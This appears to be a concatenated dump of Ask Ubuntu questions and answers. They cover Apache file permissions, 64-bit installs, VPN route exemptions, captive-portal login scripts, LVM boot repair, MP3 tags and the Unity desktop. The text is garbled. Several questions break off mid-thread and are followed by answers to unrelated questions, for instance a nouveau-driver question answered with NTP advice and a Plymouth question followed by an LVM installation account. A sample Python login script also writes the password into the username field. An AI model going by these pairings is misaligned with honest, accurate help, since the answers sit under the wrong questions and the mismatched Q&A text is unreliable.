compiz?

I know file permissions have been covered on here before, but im struggling to get my head around the concept for my scenario. \n\n\n*\n\n*I created the files on an old ubuntu installation.\n\n*Ive copied the files into my new ubuntu installation and put them in my webroot.\n\n*When i attempt to run the files (theyre PHP files) i get an error relating to permissions\n\n\nin an attempt to fix this, i assumed that they must still be owned by the previous owner, so i ran chown -R on the directory, with my username as an argument, in order to take ownership of all of the files in the directory. It should be noted that the usernames between new and old ubuntu installations were the same. \nWhen i attempt to run the files again, same problem: 500 error due to permissions problems. Can anyone tell me what other steps i should take?\nThe webroot for my apache installation is inside my home folder. If i create new files in my webroot, they also work as expected, its only the old files that are causing the problem.\n\nA: If your server documents are in /home/$USER/public_html directory you need to run\nsudo chown -R www-data:www-data /home/$USER/public_html\n\nto give ownership of the DocumentRoot folder to the user www-data and group www-data.\nThen you can add yourself to the group www-data\nsudo adduser $USER www-data\n\nFinally, you need to make the DocumentRoot folder writable by owner (www-data user) and to your self (as part of the www-data group):\nsudo chmod -R 775 /home/$USER/public_html\n\nFor convenience you can make script named public_html_fix.sh with content:\n#!/bin/bash\n\nsudo adduser $USER www-data\nsudo chown -R www-data:www-data /home/$USER/public_html\nsudo chmod -R 775 /home/$USER/public_html\n\nSave it inside /home/$USER/bin and make it executable using:\nsudo chmod +x /home/$USER/bin/public_html_fix.sh\n\nThen you call it whenever you need, from wherever on the file system you happen to find yourself like this:\npublic_html_fix.sh\n\n\nA: The directories above your webroot should have the execute bit set to allow Apache descend into the directories.\nIf you have your webroot located at /home/user/htdocs, the /, /home, /home/user and /home/user/htdocs should have the execute bit set.\n\nThe above solution \"works\", but it's not ideal. If you've created a folder, Apache cannot write to it. The reverse happens too.\nThis can be \"fixed\" by setting umask 0007 and adding yourself to the Apache group (www-data if I'm not mistaken), so that newly created files and folders are writeable by the group.\nAlternatively, you can install an alternative Apache MPM: Apache2 MPM ITK (info on configuring) and adjust the configuration so Apache runs under your user.\n\nA: Apart from chmoding files and editing apache .conf files, I want to say that nothing worked for me because my files were on a partition that I had auto-mounted via nautilus. This limits the partition for your user only.\nTo check if your files are visible by www-root or whatever user runs apache (run ps -aux | grep apache2 to check), run the following command:\nsudo su -l www-data -s /bin/bash\n\nand try to read a file from your document root.\nIf the file is not readable check that:\n1) you have set all other file permissions\n2) you have used FollowSymlinks in your .conf files if needed\n3) you have set up DocumentRoot \n3) mount your partition for all users. I had to edit /etc/fstab and specify my partition via its UUID:\nUUID=afdee1d3-5bb8-4652-892f-e83a9b5ff72e /mnt/4tb      ext4    rw,nosuid,nodev,errors=remount-ro\n\nThen unmount your partition via nautilus and do a sudo mount -a. If all goes well your files are now under /mnt. Update your symlinks and you're good to go.\n\nA: The best way I have found to always set this up is the way VirtualMin does it.\ncreate user and group\n\"myhome\"\nMake apache user a member of group \"myhome\".  Not the other way around like some of the explanations here describe\nSo now apache has read and execute access to /home/myhome in addition to /home/myhome/www\n\"myhome\" user has write access\n", "Q: What are the (possible) future plans for Ubuntu-izing 3rd party software (please read details)? I know the title is confusing, because honestly it is hard to find the correct title. What I am asking is basically, in light of unity, ubuntu-one and other such projects, is Canonical/The Ubuntu Development team (correct me about the proper title :P) planning on more original software?\nFor instance, Ubuntu is quickly becoming a strong ecosystem of it's own, but has to rely on a lot 3rd party software in various areas, which is fine (I love that), but sometimes this software has major shortcomings that Ubuntu inherits. Programs like Skype, (sorry I can find any other off hand examples) miss out in major areas, such as proper desktop integration. If Ubuntu has it's own client side software, then it could be better integrated and more appealing.\nAnother example is backup. Ubuntu One is great for that, and getting better, but for example, Deja Dup is not installed be default, and even if it was, misses some integration features on Ubuntu (and will in the future as the ecosystem becomes more unique). This could be used as the basis for built in backup software of course, just with better integration with Ubuntu.\nIn a nutshell then,\n\n\n*\n\n*Is there some kind of roadmap/blueprint governing the direction Ubuntu will take in the future regarding such software?\n\n*How is Canonical planning to engage the community in the process of developing Ubuntu's wider software identity?\n\n\n(Sorry if my question seems confusing/like_a_rant/mixed_up)\n\nA: It's possible that your best bet for a heads up on this stuff is to follow the Ayatana mailing list here :\nhttps://lists.launchpad.net/ayatana/\nHowever that list focusses mostly on design, rather than straight software development roadmap.\nGiven how UbuntuOne and UbuntuFont was developed offline then introduced into betas with little to no prior announcement, I'm guessing that some things are still decided behind closed doors at the Canonical offices (they are a company out to make money after all and their developers are paid to do a job).\n", "Q: Should I install 64-bit Ubuntu if my hardware supports it? I've just got my first 64-bit-capable laptop (previously I've only dealt with 64-bit on servers). Of course the first thing I am going to do is to format the hard drive and install Ubuntu instead of Vista, and the question is should I install 32-bit or 64-bit Ubuntu?\nHere are the details which can matter:\nCPU: Core 2 Duo 2 GHz, RAM: 3.45 GB. I am going to intensively use multitasking, virtualization (VirtualBox) and run memory-heavy Java, C# and native applications.\nI ask because my experience shows that 32-bit desktop systems usually work faster and consume less memory. And as far as I know (have read somewhere, never tried myself) 64-bit Java is known to be extremely RAM-wasting compared to 32-bit JRE.\n\nA: Points to consider:\n\n\n*\n\n*Because address space is larger, applications do consume more RAM. It's ralatively tiny but can be a deciding factor if RAM is the deciding factor (eg in a rented server). Desktop and even laptop RAM is cheap though.\n\n*Native programmes do run faster but it's not always a tangible difference. For big things however (as you suggest you'll be doing) it can make a real difference.\n\n*Compatibility is larely irrelevant these days. Flash is available and Sun Java works (there's even a native JRE that's fairly complete). You can run most pure 32bit binaries just fine, it's just a case of installing its dependencies.\n\n*Security is not really a factor. 32bit kernels support NX bits and most of the touted features.\n\n*Neither is the total memory limit unless you have processes that require more than 4GB of RAM. The PAE kernel works.\n\n*You shoud also look to the future. I don't like to reinstall when I can help it. The future is 64 bit and its performance gains will only increase s GCC gets further extended register optimisations.\nIn balance, unless this was a very RAM-tight system with no scope for upgrade, I'd go 64 bit.\n\nA: I highly recommend 64 bit operating systems wherever possible. One of the biggest benefits is security, though you also get an increase in speed, the maximum supported memory, and a few other areas. For running Virtual systems, 64 bit systems tend to be a better fit :)!\n\nA: You should take in consideration that there may be some software which runs into 32 bit versions of Ubuntu and there is NO such version for 64 bit version. So, even when you have those so-called \"alternatives\" to perform almost any task in 64 bit versions, make sure that you have found an \"alternative\" that fits your needs and makes you feel comfortable.\nIn example: To the date, I haven't found an alternative for a 64 bit version that makes me feel as happy as Mobile Media Converter does. \n\nMany people can say that I \"can do some things about\" but what I wish is Mobile Media Converter for a 64 bit version.\n\nNowadays they have released a 64 bit version right here.\nFurther than that and even when you can force the software to install, you may experience problems to perform everything you are used to do with ease in a 32 bit system.\nGood luck!\nBTW: There is no need to add comments related to \"alternatives\" to Mobile Media Converter. The rest of the comments are welcome.\n\nA: Definately, yes. \nUsing Virtualbox myself for a 500ish user network with several virtual machines, and no problems at all here. \nAnd since this works perfectly, only going with 32-bits would be a waste. \n\nA: If your system has 4GB of ram or more, then yes.  Thats the quick and obvious answer (and I noticed nobody else mentioned it)\n\nA: No question here, the answer is Yes. If you have more than 3.8 GB or so of RAM, you won't use it with 32-bit. \nI use 64-bit for desktop Ubuntu (and other distros) as well as server ubuntu (and other distros). I have not personally run into any issues or reasons not to use 64-bit, and I've had more than 4GB of RAM on every system for about 4 years; therefore, I never felt 32-bit was an option for me (and although many would say \"your milage may vary\" here, I think 64-bit is old enough now to be considered tried, tested, and true).\n", "Q: How do I set Thunderbird to open links in Opera? Because it's almost obvious that either Thunderbird or Firefox freeze my whole system after some time, I'd like to not use FF at the moment and let Thunderbird run only for a short time as long as I check e-mails. Thunderbird web links should be opened with opera from now. For that I went in Thunderbird to Preferences->Advanced->General->Config Editor and set the following:  \nnetwork.protocol-handler.app.http -> /usr/bin/opera\nnetwork.protocol-handler.app.https -> /usr/bin/opera\nnetwork.protocol-handler.warn-external.ftp -> true\nnetwork.protocol-handler.warn-external.http -> true\nnetwork.protocol-handler.warn-external.https -> true\n\nMoreover I changed in Gnome in System->Preferences->Preferred Applications Opera as web browser and I checked in FF that it should warn if FF is not the default browser (obviously it isn't anymore).\nUnfortunately all of these settings doesn't work. Thunderbird still opens web links with FF.\nAny explanations why? (I already restarted Thunderbird although I don't have to, but no effect)\n\nA: \nSearch for it in Unity.\n\nA: To always launch opera instead of firefox you can do the following:\nsudo update-alternatives --config gnome-www-browser\n\nand choose the entry with opera.\nIf the command says something like There is only one alternative in link group gnome-www-browser you have to manually add opera via\nsudo update-alternatives --install /usr/bin/gnome-www-browser gnome-www-browser /usr/bin/opera 90\n\nand retry the first command.\n", "Q: Will 3D games run in a VirtualBox4-hosted Windows system under Ubuntu with Intel GMA X4500HD card? I've just got a laptop with Intel GMA X4500HD card (which is said to be DirectX10-compliant, while my previous laptop had Intel 82852/855GM and no chance to play modern 3D games at all). It would be nice if I could play some games (like HalfLife 2, StarCraft 2, Fallout 3) from time to time (while I am ok using lo-fi settings and having low performance) but as I strongly prefer Ubuntu environment and don't need Windows usually I'd like to install Windows inside VirtualBox instead of using a dedicated partition and dual-boot. So the question is if VirtualBox can use 3D acceleration of Intel GMA X4500HD if run on Ubuntu.\n\nA: No you can't the 3D Driver that Virtualbox Uses it's not even capable of running the Aero interface in the virtual machines, the 3D it's just basic, and it can't directly access your GPU to provide full 3D support\n\nA: As far as I know it's not possible.Virtualbox emulated a graphic processor for your VM and you can not use your actual device.\nRead more here: 3D Acceleration Support - http://forums.virtualbox.org/viewtopic.php?f=1&t=16&start=0\n\nA: https://www.virtualbox.org/manual/ch04.html#guestadd-3d\n...if an application inside your virtual machine uses 3D features through the OpenGL or Direct3D 8/9 programming interfaces, instead of emulating them in software (which would be slow), VirtualBox will attempt to use your host's 3D hardware. This works for all supported host platforms (Windows, Mac, Linux, Solaris), provided that your host operating system can make use of your accelerated 3D hardware in the first place.\n", "Q: Exempt programs or domain from VPN connection When I connect to a VPN, all my network traffic is automatically routed through it. Is there a way to add exemptions to that? I don't know if adding exceptions has anything to do with the VPN protocol, but the VPN I'm using is of the OpenVPN protocol.\nSpeaking of OpenVPN, why is it not installed by default on Ubuntu installs, unlike PPTP?\nI could not get the list of IRCHighWay's servers, and this is the result I get trying to connect on XChat with running the bash script running:\n* Looking up irc.irchighway.net\n* Connecting to irc.irchighway.net (65.23.153.98) port 6667...\n* Connected.

I had forgotten to check ip route list before running the script, and this is the one after running it:\n~$ ip route list\n99.192.193.241 dev ppp0  proto kernel  scope link  src 173.0.14.9 \n173.0.14.2 via 192.168.1.1 dev eth1  proto static \n173.0.14.2 via 192.168.1.1 dev eth1  src 192.168.1.3 \n192.168.1.0/24 dev eth1  proto kernel  scope link  src 192.168.1.3  metric 2 \n169.254.0.0/16 dev eth1  scope link  metric 1000 \ndefault dev ppp0  proto static\n\nOh and running the script returned this output:\n~$ sudo bash irc_route.sh\nUsage: inet_route [-vF] del {-host|-net} Target[/prefix] [gw Gw] [metric M] [[dev] If]\n       inet_route [-vF] add {-host|-net} Target[/prefix] [gw Gw] [metric M]\n                              [netmask N] [mss Mss] [window W] [irtt I]\n                              [mod] [dyn] [reinstate] [[dev] If]\n       inet_route [-vF] add {-host|-net} Target[/prefix] [metric M] reject\n       inet_route [-FC] flush      NOT supported\n\nI ran the script after connecting to the VPN.\n\nA: Create a file, irc_route.sh, that contains:\n#!/bin/bash\n# script to make connections to irc.irchighway.net go via DEV.\nDEV=eth0 \nGW=$(ip route list | sed \"s/.* via \\([0-9.]*\\) dev $DEV.*/\\1/;t;d\"|head -1)\nroute add -host irc.irchighway.net gw $GW $DEV\n\nChange DEV to be the interface that you get your internet connection from (might be any of wlan0, eth1, eth0, ppp0). Then run the script with sudo bash irc_route.sh, you can check the results by running ip route list before and after.\nThe IP of the default gateway for internet traffic on the DEV device is stored in the variable GW, which is then use to route all traffic going to the irc.irchighway.net  server through your default GW instead of the OpenVPN connection you have.\nTo make this work for all IRCHighWay servers you would have to get a list of all the servers.\nserver_list.txt:\n irc.irchighway.net\n caliburn.pa.us.irchighway.net\n\nScript:\n#!/bin/bash\n# script to make connections to irchighway go via DEV.\nDEV=eth0 \nGW=$(ip route list | sed \"s/.* via \\([0-9.]*\\) dev $DEV.*/\\1/;t;d\"|head -1)\ncat server_list.txt| xargs -iSERVER route add -host SERVER gw $GW $DEV\n\nThere is an \"easier\" solution, you can mark ports and route based on that, see iproute2 tutorial  but I haven't used that. And there are some problems with that kind of routing if you don't know what you are doing.\n\nA: You can not hinder specific programs to make connections through the VPN, but if they want to reach a specific host or port number then it's possible. I'm going to assume worst case, that you want certain apps to bypass the firewall. \nThis should be possible to do by using SELinux, by banning network connections from one program. I do not know of any good tools to do this configuration, nor how to change it on the fly.\nI think there was once a module in iptables that could match on sending program, but I haven't seen it in a while.\n", "Q: How can I find out which cards are supported by the nouveau driver?

I tried changing a few of those, but nothing short of a reboot would get its clock set properly. Any ideas what the problem may be?\n\nA: Is there firewall preventing UDP traffic?\nAlso, NTP typically corrects time very slowly. You can try stopping your ntpd and run something like\nntpdate pool.ntp.org\n\nAnd see what it outputs. If it's something like\n\n17 Feb 20:03:13 ntpdate[3046]: adjust time server 194.100.2.198 offset -311.135718 sec\n\nthen it fixed that offset successfully.

I often connect to a network, that is open, but requires a key-pass authentication before used in a webpage. Is it possible to automate the authentication with a script?\n\nA: What a fun problem.\nWhile I'm sure ændrük's answer would probably work, I'm slightly adverse to letting something dependant on desktop software manage the network availability.\nI would suggest you play around with Python's Mechanize library. You can install it from the repositories via:\nsudo apt-get install python-mechanize\n\nThen get scripting. You need to start by finding out the stucture of the page you're submitting to. You need to find where you form comes and what fields need to be entered to submit. Once you know that, it's really as simple as just writing a quick little form parser and submitter. Mechanize does all the heavy lifting. Here's a quick example adapted from their docs on forms:\nimport sys\nfrom mechanize import ParseResponse, urlopen, urljoin\n\n# replace this with the actual login page\n# you'll need to do some research\nuri = \"http://theloginpage.com/\"\n\nresponse = urlopen(uri)\nforms = ParseResponse(response, backwards_compat=False)\nform = forms[0]\nprint form\nform[\"username\"] = \"your username\"\nform[\"username\"] = \"password\"\n\n# form.click() returns a mechanize.Request object\n# (see HTMLForm.click.__doc__ if you want to use only the forms support, and\n# not the rest of mechanize)\nprint urlopen(form.click()).read()\n\nDepending on how their system works, this might be enough. You might have to tie in some cookie jarring to keep a session alive while they turn the connection on, but technically speaking, there's no argument why they should require that.\nThen you just need to tie this into the networking system so it gets called. Loading it from /etc/network/if-up.d should work but I suggest you prefix your code with a check to make sure you're really on the hotspot that your login works for.\n\nA: Depending on the type of captive portal in place, you might be able to authenticate via a POST request sent using Wget (use Tamper Data to learn what data needs to be sent) or by using an iMacros script in Firefox.\nYou can add a script to /etc/network/if-up.d to make it run every time a network connection is established. Have the script verify what network you're on with iwconfig before doing anything, and be sure to start commands using sudo -u yourusername so you don't run your web browser as root.\n", "Q: Ubuntu One Windows beta: how can I set the synchronized folders? \nPossible Duplicate:\nUbuntu One Sync for multiple folders in Windows, not just the Ubuntu One folder \n\nUbuntu one on windows beta, how can I set the synchronized folders? \n\nA: I think you can't. It synchronizes My Documents\\Ubuntu One, but there is no settings for changing this or adding multiple locations.\n\nA: NTFS supports various kinds of symlinks and hardlinks, so you can always symlink the folders you want to synchronize into the UbuntuOne folder. That's what I do with my Dropbox.\nWindows 7 has proper symlinks and hardlinks as well as a commandline utility called mklink for managing symlinks and hardlinks as well as junctions (see below).\nOlder versions only support junctions (symlinks were only added in Windows 7 or maybe Vista) which work very similar. However, they don't include a tool for creating them, but there is a gratis tool called junction by SysInternals.\n\nA: The beta does not allow you to choose other folders to sync or to configure the one to be used. This is a limitation we added on the Beta since it was code that we wanted to use to test if the solution was possible. \nIn the very near future we are going to release the real thing where you will find all the different feature you have on linux (choose the root folder via config, sync other folders, automatic syncing etc...)\nIf I were you I would wait until we release the new version :)\n", "Q: Blank blue screen after trying to fix plymouth logo I have ATI Graphics on my machine. \nI was trying to fix plymouth logo which was bad looking because of my graphics by following an article on Softpedia.

I also created a second LV for /var; this I don't think is relevant.\n\n*creating a filesystem (ext4) on each of the two LVs.\n\n\nAfter taking these steps, the GUI installer offered the two LVs as installation targets; I gladly accepted, also putting /boot on a primary partition separate from the LVM partition.\nInstallation seemed to go smoothly, and I've verified that both the root and var volumes do contain acceptable-looking directory structures.\nHowever, booting fails; if I understood correctly what happened, I was dropped into a busybox running in the initrd filesystem.\nAlthough I haven't worked through the entirety of the grub2 docs yet, it looks like the entry that tries to boot my new system is correct:\nmenuentry 'Ubuntu, with Linux 2.6.35-22-generic' --class ubuntu --class gnu-linux --class gnu --class os {\n    recordfail\n    insmod part_msdos\n    insmod ext2\n    set root='(hd0,msdos3)'\n    search --no-floppy --fs-uuid --set $UUID_OF_BOOT_FILESYSTEM\n    linux   /vmlinuz-2.6.35-22-generic root=/dev/mapper/$LVM_VOLUME_GROUP-root ro   quiet splash\n    initrd  /initrd.img-2.6.35-22-generic\n}\n\nNote that $VARS are replaced in the actual grub.cfg with their corresponding values.\nI rebooted back into the livecd and have unpacked the initrd image into a temp directory.  It looks like the initrd image lacks LVM functionality.  For example, if I'm reading /usr/share/initramfs-tools/hooks/lvm2 (installed with lvm2 on the livecd-booted system, not present on the installed one) correctly, an lvm executable should be situated in /sbin; that is not the case.\nWhat's the best way to remedy this situation?  I realize that it would be easier to just use the alternate install CD, which apparently supports LVM, but I don't want to wait for it to download and then have to reinstall.\n\nA: You hit the problem right on the head: the initramfs does not have LVM support. Here's how to fix it:\n\n\n*\n\n*Boot the LiveCD again\n\n*Install lvm2 again in the Live environment\n\n*Bring up the Volume Group (if -a y does not work try -a yes)\nvgchange -a y\n\n\n*Get the root LV, /boot, and /dev mounted under the separate tree\nmkdir /newroot\nmount /dev/yourVG/rootLV /newroot\nmount /dev/yourbootpartition /newroot/boot\nmount -o bind /dev /newroot/dev\n\n\n*Copy the needed packages into the /newroot tree\ncp /var/cache/apt/archives/*deb /newroot/tmp/\n\n\n*Chroot into the new tree and install the packages\nchroot /newroot\ncd /tmp\ndpkg -i *.deb\n\nAt this point, things should be back to normal (since the initramfs will be regenerated when lvm2 is installed). If not, you can play with running update-initramfs -u inside the chroot.\n\nA: After installing the system to the hard disk, you need to install lvm2 into that system before it can boot.  If you installed lvm2 on the livecd, then the packages will still be in /var/cache/apt/archives.  Change to that directory, mount the hard disk, and install the packages to the hard disk using dpkg --root=/mnt *.deb.  In your case, you need to mount the root fs to /mnt, and also the var fs into /mnt/var.\nAlso you don't need the separate /boot partition, and a separate /var partition is questionable.\n\nA: I ended up doing mostly what Kees Cook nicely lays out, with some help from the final section of this walkthrough.  However:\n\n\n*\n\n*I didn't bind-mount /dev.  It looks like this caused some error messages later; see below.\n\n*I mounted my /var volume on the new root in addition to /boot.\n\n*I didn't copy the debs into the /tmp of the new root.  Instead, I ran # apt-get install aptitude; aptitude install lvm2 after chrooting.\n\n\n*\n\n*I did this in order to register these actions in the apt database: for example, aptitude, and perhaps also apt-get, will track which packages were installed explicitly and which were installed automatically as dependencies.\n\n*Since I'm actually getting my packages via a local apt proxy (running apt-cacher-ng), I didn't even have to wait for them to download again.  I did have to make a file at /etc/apt/apt.conf.d/02proxy containing Acquire::http::Proxy \"http://local-apt-proxy-server:3142\"; before running apt-get.  I had done the same thing before starting to install packages while running off the LiveCD before doing the install.\n\n*I got an error message or warning a couple of times, stating\nCan not write log, openpty() failed (/dev/pts not mounted?)\n\n**mount -o bind /dev/pts /mnt/YouNameIt/dev/pts\n    This did not prevent the appropriate lines from being added to `/var/log/dpkg.log`.\n\n    I suspect that this issue could have been averted by bind-mounting `/dev`, but I don't really understand what it means, i.e. I don't know what log it's referring to, or why it would need to access a pty in order to write to a log.\n\n", "Q: Find minimal equivalent of packages currently installed I have used a tool that calculates the minimal set of packages you can install to get the current set of packages you have.  This is different than telling you what your selections are.  It literally finds the shortest list of packages that will, through dependencies, give you what you currently have.\nI forgot where to find this tool.  What is it called?\n\nA: aptitude can get you most of the way with its search feature. Here's how you find everything installed that wasn't only an automatic dependency:\naptitude search -F \"%p\" \"?installed ?not(?automatic)\"\n\nThis wont be optimal some of these may be able to be removed but I don't know a simple way to work that out. Perhaps the answer lies in man aptitude.\nOn second thought, with that list you could loop through it and find the dependant packages (not dependencies) for each one. If one of those is in the master list, remove the current package from the list... but only after you've parsed the whole list or you'll miss intermediates in a 3+ level dep tree.\nYou find dependants with a query like this:\naptitude search '~i~Dpackage'\n\nI'd try and write the script but I'm typing this on a tiny phone keyboard. Even I have limits.\nEdit: After five minute of trying to sleep, I started hacking away on this. something like this should do the job:\norig=$(aptitude search -F \"%p\" \"?installed ?not(?automatic)\")\nnewlist=\"\";\nfor p in $orig; do\n    depended=0;\n    for dependant in `aptitude search -F \"%p\" \"~i~D$p\"`; do\n        if [[ $orig == \"* $dependant *\" ]]; then\n            depended=1;\n        fi;\n    done;\n    if [[ $depended == 0 ]]; then\n        newlist=\"$newlist $p\";\n    fi;\ndone;\necho $newlist\n\nNote this takes a really long time to run and it might be over-keen (eg it will remove thing that you manually installed, that you want to be manually installed, if they are depended on by something else in the $orig list that you perhaps installed afterwards).\n\nA: I have written a small python script to do that, posted as a gist here.\nYou give it a set of package names on the command line, and it should give you a smaller, minimal set of packages that imply all the others you have given as arguments. Here, x11-proto-fixes-dev is implied (a dependency of) by libgtk2.0-dev:\nfuwaad:~$ python mindeps.py x11proto-fixes-dev libgtk2.0-dev\nlibgtk2.0-dev\n\n\nA: I tried answers from this and two other similar questions on a system I've been running for years and the shortest list I could get was 1338 packages, most of which were obviously dependencies or stock packages.\nHowever, over on the Unix/Linux Stack Exchange I found this answer, which pulls the list of stock packages for your install from the Ubuntu mirror and filters it out.  That got my list down to 404 packages that looks sane to me.\n", "Q: How to find and back up only files not part of a package How can I find a list of every file that is modified or added outside the debian package management system?\nCruft is unmaintained and doesn't know about the way today's debian package management tools, etc work.  For instance, it misses postinst created files and logs that are actually listed as handled by a package and have not been modified since installation date/time.\n\nA: Cannot understand why you want to backup such files, but you can have such a list with a command like this:\n#!/bin/bash\nexport LC_COLLATE=C\njoin -v1 <(find / -mount | sort) <(cat /var/lib/dpkg/info/*.list | sort -u)\n\n", "Q: Is Error Recovery Control or TLER necessary for software RAID5 using LVM I ave been told that for RAID configurations you don't what to use standard desktop drives because they when/if they enter a error recovery mode they might time out and get dropped from the raid.\nIs this true for LVM software RAID or this this a hardware RAID issue primarily?.

For one, it borks the chronology of entries in your log files, system daemons might freak out, etc. What it does instead is \"drift\" your system clock into place. If you want to check how far off from \"the actual time\" you are you can query an ntp server:\nntpdate -q pool.ntp.org\n\nNTP works by adjusting the length of a second on your system by a slight bit so that you slowly get the correct time.

Find your hard disk and parition and look for the \"device\" field. The openSUSE installer will let you install there, and wipe out all of the data that was there before. It will also install a new boot-loader and detect all of the operating systems on your computer. \n\nA: This way, your bootloader will be erased and you can not boot window$ anymore.If you want to do this you must repair your window$ installation after deleting the partition.\nThe easiest way for you is formatting the ubuntu partition in suse installation process.So you can install suse on the free space.\nP.S: Here is the safe way to remove ubuntu from a dual-boot machine and fix MBR: http://www.makeuseof.com/tag/how-to-safely-uninstall-ubuntu-in-windows-dual-boot-environment/\n", "Q: How can I get my IOGear GCS632U KVM switch to work? I bought a KVM switch and I'm trying to use it to have it connected to my main PC (win7) and my new machine I just installed ubuntu on. I hooked it up properly, and tried using it. It worked when switching from the win7 machine to the ubuntu one, but after the (1st and only) successful switch, ubuntu just didn't seem to recognize my mouse or keyboard.\nBasically when I tried it the easiest was to explain what happened was it only worked with Win7. When I switched over to ubuntu by doing a [scroll-lock] [scroll-lock], my keyboard and mouse were not recognized. However, the lights on the keyboard and mouse did work when on ubuntu, but they didn't function, and since keyboard wouldn't function, I couldn't do a [scroll-lock] [scroll-lock] to switch back to the win7 machine. So I was basically locked in to ubuntu with no mouse or keyboard, and I had to unplug the keyboard/mouse USB's and d-sub to plug the monitor d-sub back into win7 computer to type up this thread and google the issue. Seems some people have had this issue before but I couldn't find a fix... \nI am 80% sure it has to do with drivers... but there isn't any for KVM switches, at least not this one also I never was unable to find ubuntu drivers/firmware for my mouse and keyboard (Logitech G15 and Razer Deathadder 3500).

I've filed a bug upstream about this.\nQuestion\nTo fix this problem, I'd like to erase and rewrite the ID3 tags on my MP3s. Ideally I don't want any of the tags to change. Do you know of a program or script which can do this? Somehow iterate over all of my files and save their metadata, then erase it from the file leaving just the audio before writing it back. I'm trying to avoid writing a script to do this myself (although I will do if nobody knows a program/can come up with one). Hopefully this clean rewrite will then be accepted by the server. If not, well, at least we tried.\n\nA: Picard is an amazing program, highly recommend it. +1 to ssweeny's rec.\nHowever, if you just want to rewrite all existing tags, I think Ex Falso (apt link) and id3convert (apt) will better suit your needs.

The Gnome Keyring Manager is used to hold direct passwords and hand them out when applications need them (like when checking your email or logging into remote systems). The kernel keyring is used for in-kernel operations that need encryption, like eCryptfs.\nNeither eCryptfs nor the Gnome Keyring Manager store your passphrases in the clear. Gnome Keyring Manager stores an encrypted database to disk and keeps passphrases in memory only. The eCryptfs tools do a similar thing: your mount passphrase (a large random bit string) is encrypted on disk with your login passphrase. This is what is used internally by eCryptfs and again, does not hit the disk in the clear.\n", "Q: Where to start studying for developing ubuntu?

As per LWN article \nReleased template is ubuntu-project, which automates working \nwith Ubuntu-compatible code (using Bazaar for version control, \nDebian packaging, and Launchpad.net Personal Package Archives (PPA) \nfor releases).\n\nYou can also read about it on this Ars Technica article from Ryan Paul\nLanguage of Choice\nPython is the most famous choice of development as I can see. I might be wrong since many also like to develop on Gtk/C or Boost/C++. \nThere are also other languages like Vala using which you can have native applications but have a higher level language.\nIf you know C#, you can use it for creating applications using Gtk# for UI.\n\nA: Well, my answer maybe is useless, but the only I followed: just start reading the unity (and related project like compiz, nux...) sources and try to work on what you're intrested. grep could be also a nice friend when it comes to work on simple modifications.\n", "Q: What is the target of Unity? First Unity was developed for Netbooks. But the Netbook Market is shrinking. Unity is not specialized for tablet pcs like Android 3, but it may work well with some specialized Apps for those devices.\nUnity is still nice for Notebooks with small displays, but there is no big advantage on the desktop compared with other desktop environments like Gnome 2/3 or KDE.\nSo what's the point? \nMy first suggenstion was a hybrid between tablet pc and a desktop, for example for a manager. He can plug the tablet in a docking station in his office and he can work at a normal desktop, whats not possible with iOS or Android. \nIf he is in a meeting he can use it as a tablet to make notes, for example. Or if he is somewhere else outside the office or the company. \nSame for normal users. They can dock the tablet and use it like a normal desktop pc or they can lie on the couch and browse in the web, read a book or chat with friend.\nSo, thats my suggestion. But what is the real plan for Unity or Ubuntu in general? I'm curious ;)\n\nA: \nUnity is still nice for Notebooks with\n  small displays, but there is no big\n  advantage on the desktop compared with\n  other desktop environments like Gnome\n  2/3 or KDE.\n\nUnity is still GNOME. Uses Gnome technologies under the hood. The user interface is different. Right now we have gnome-panel as user shell which is getting deprecated.\n\nSo, thats my suggestion. But what is\n  the real plan for Unity or Ubuntu in\n  general? I'm curious ;)\n\nFrom what I heard, they want to experiment and come up with a great user-shell for having a great user-experience. As of writing this, the experience with Unity is not top-class, but it is improving day by day.\nUnity has a concept of Dash which is better explained by the screenshot below\n\nIf you are confused what various terms are used for defining various parts, then you can find it here on this AskUbuntu question\n\nMy first suggenstion was a hybrid\n  between tablet pc and a desktop, for\n  example for a manager. He can plug the\n  tablet in a docking station in his\n  office and he can work at a normal\n  desktop,\n\nWhy isn't that possible. The bigger thing is that - It lies with hardware manufacturers to have such a thing. Just like you have a Touchpad on laptop but you can connect external mouse when you put it on your desk.\nSimilarly, you can have Ubuntu/Unity tablet(touchscreen) which you can dock at your workplace, plug in a keyboard and start using it. If you plug in a mouse, a pointer should appear, when you unplug, the pointer should disappear.\n\nA: The real plan is to have Unity be Ubuntu's default interface for desktops, netbooks and tablets. You will most likely see tablets sold with Ubuntu in the near future. When defining tablets we must specify that there are two architectures that are usually used. The Tablet PC which has a x86_64/i686 processor and the iPad-like tablets which utilize ARM processors.\nFor the former there are already models that work well:\nTo take an example from one of my friends, the HP Elitebook 2470p  (hp.com) works by default (out of the box) with Ubuntu.\nFor the latter, the following article outlines the current efforts to create an interface for the Ubuntu ARM port. This interface looks different from the Unity interface. My guess is the ARM interface and theming will be unique to each manufacturer's vision.\nhttp://www.desktoplinux.com/news/NS7970264054.html\n", "Q: is it better to have a separate partition for /boot? \nPossible Duplicate:\nIs a /boot partition necessary anymore? \n\nWell, the question title says it all. Are there any benefits of creating a separate directory for /boot. Is there any kind of grub/any-other-bootloader crash that can corrupt the partition it is installed on? or any dual-boot scenarios where having separate /boot partition can save me?\n\nA: Exactly what you said. For example, i once had (am talking about 9.04 or 9.10 here) a problem where the root partition got all weird on me. Since i had the boot partition in the same place as everything else i could not boot and try to fix anything. After that i learned that i should have the boot part separate from the rest since in some extreme cases if something goes bad, it will go bad only the specific partition. I also recommend to have not only the partition of boot separate from others but the home also separate so in the event of updating or reinstalling you do not need to do a backup for all your things.\nIt also helps to have the boot part in another partition since if it happens to malfunction you know you have everything in another partition safe from harm.\n\nA: This has changed alot in the last few years with the way Ubuntu has evolved as an operating system. The following link on Jorge Castro's blog pretty much sums it up as not required from the people that bring us Ubuntu.....\n\nA: If your root partition is on LVM, software RAID, of XFS filesystem- separate /boot is mandatory. Otherwise it is not necessary, but it is good practice to have separate /boot.\n", "Q: How do I get a Line6 UX1 soundcard to work?

Here's how to set the path you need :\nGo to Tools > Preferences > Paths\nIn the LyXServer pipe field, enter ~/.lyx/lyxpipe and save.\nHere's the preferences screen.

